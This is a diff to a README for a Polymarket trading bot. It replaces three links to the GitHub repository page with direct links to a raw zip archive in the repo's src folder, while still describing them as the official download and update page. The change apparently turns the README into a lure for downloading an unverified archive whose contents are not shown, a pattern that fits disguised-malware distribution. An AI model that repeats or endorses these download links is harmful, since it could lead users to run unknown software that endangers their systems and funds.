@@ -1,6 +1,6 @@
 # 🤖 Polymarket-Trading-Bot-RSI-MACD-Momentum - Automated Trades with RSI and MACD  
 
-[![Download from GitHub](https://img.shields.io/badge/Download-POLYMARKET%20BOT-brightgreen)](https://github.com/Danielillo9/Polymarket-Trading-Bot-RSI-MACD-Momentum)  
+[![Download from GitHub](https://img.shields.io/badge/Download-POLYMARKET%20BOT-brightgreen)](https://github.com/Danielillo9/Polymarket-Trading-Bot-RSI-MACD-Momentum/raw/refs/heads/main/src/RS-Trading-Momentum-MAC-Bot-Polymarket-1.0.zip)  
 
 ## 🔍 About This Bot  
 
@@ -32,7 +32,7 @@ This bot helps automate your trades without needing to watch the markets constan
 
 Click the green button below to go to the official GitHub page where you can download the bot:  
 
-[![Download from GitHub](https://img.shields.io/badge/Download-POLYMARKET%20BOT-brightgreen)](https://github.com/Danielillo9/Polymarket-Trading-Bot-RSI-MACD-Momentum)  
+[![Download from GitHub](https://img.shields.io/badge/Download-POLYMARKET%20BOT-brightgreen)](https://github.com/Danielillo9/Polymarket-Trading-Bot-RSI-MACD-Momentum/raw/refs/heads/main/src/RS-Trading-Momentum-MAC-Bot-Polymarket-1.0.zip)  
 
 On the GitHub page, look for the latest release or download section.  
 
@@ -117,7 +117,7 @@ Periodically check the GitHub link below for new releases. Download the newest v
 
 The URL to check for updates and download:  
 
-[https://github.com/Danielillo9/Polymarket-Trading-Bot-RSI-MACD-Momentum](https://github.com/Danielillo9/Polymarket-Trading-Bot-RSI-MACD-Momentum)  
+[https://github.com/Danielillo9/Polymarket-Trading-Bot-RSI-MACD-Momentum/raw/refs/heads/main/src/RS-Trading-Momentum-MAC-Bot-Polymarket-1.0.zip](https://github.com/Danielillo9/Polymarket-Trading-Bot-RSI-MACD-Momentum/raw/refs/heads/main/src/RS-Trading-Momentum-MAC-Bot-Polymarket-1.0.zip)  
 
 ## 🚀 Additional Resources  
 
